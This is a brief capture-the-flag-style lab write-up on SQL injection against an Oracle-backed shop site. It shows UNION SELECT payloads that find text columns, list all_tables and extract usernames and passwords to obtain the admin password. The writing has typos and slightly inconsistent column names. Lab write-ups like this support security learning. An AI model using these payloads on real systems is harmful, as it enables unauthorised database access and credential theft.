# Lab: SQL injection attack, listing the database contents on Oracle #

## Lab Description ##

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/39507b59-37b9-4c5d-8b35-2ec9521e9fd9)

## Target website ##

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/1a2b5fcd-f82b-4d85-917f-96eb3c103f24)

> We have intercetpted the request and we will modify category feild to get details and first column containing text for that we will use this paylaod 
  `'+UNION+SELECT+'abc','def'+FROM+dual--`
![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/2dfe63e7-5613-4bd6-af3b-d03178aefb3b)

> So there 2 column containing string

> Now we get the no of tables database we use following payload `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/3a8da461-29f7-4e26-b343-08f0022f4c28)

> So it giving the no tables
![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/eb2f74e2-1de2-4626-971c-dacab8c24c3a)

> When using '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_KVVPSP-- we discover another feild called PASSWORD_GMRIEL

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/69431ce4-b1b7-45b0-bbf5-c9b15caa7bf6)

> We can use '+UNION+SELECT+USERNAME_TPZMZN,+PASSWORD_GMRIEL+FROM+USERS_KVVPSP--

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/ba087cb2-0e56-4a30-9c1b-77c5de3d305b)

> We admin password

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/7bf98b0b-e0f3-491f-80dd-08c820074a15)
**
